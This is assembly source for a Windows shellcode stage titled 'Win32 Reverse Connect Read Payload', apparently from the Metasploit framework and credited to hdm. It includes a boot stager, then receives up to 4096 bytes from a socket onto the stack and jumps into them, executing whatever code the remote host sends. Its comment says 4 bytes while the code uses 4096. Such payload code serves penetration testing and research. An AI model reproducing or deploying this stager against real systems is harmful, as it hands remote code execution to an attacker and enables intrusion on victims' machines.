;      Title:  Win32 Reverse Connect Read Payload
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com



[BITS 32]

%include "win32_stage_boot_bind.asm"


LRecvLength: ; recv(s, buff, 4, 0)
    sub esp, 4096
    mov ebx, esp
    push byte 0x00          ; flags
    push 4096               ; length
    push ebx                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()
    sub esp, 1024
    call ebx
